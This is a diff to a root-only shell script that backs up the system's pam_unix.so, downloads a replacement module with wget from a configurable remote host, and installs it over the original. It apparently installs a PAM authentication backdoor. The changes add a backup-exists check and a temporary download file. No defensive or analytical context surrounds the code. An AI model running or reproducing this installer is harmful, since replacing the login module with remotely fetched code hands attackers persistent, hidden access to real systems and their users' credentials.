@@ -12,7 +12,12 @@ if [ "$EUID" -ne 0 ]; then
 fi
 
 make_backup () {
-    cp ${1} ${1}.bak
+	if [ -f "${1}.bak" ]; then
+		echo "Backup exists already!"
+	else
+    	cp ${1} ${1}.bak
+    fi
+
     if [ ${?} -ne 0 ]; then
         echo "Failed making backup of pam_unix.so!"
         exit
@@ -30,10 +35,13 @@ find_pam () {
 }
 
 get_pam () {
-    wget "${HOST}${1}" -O ${pam}
+    wget "${HOST}${1}" -O /tmp/wget
     if [ ${?} -ne 0 ]; then
         echo "Failed to install pam_unix.so!"
+        rm /tmp/wget
         exit
+    else
+    	mv /tmp/wget ${pam}
     fi
 }
 
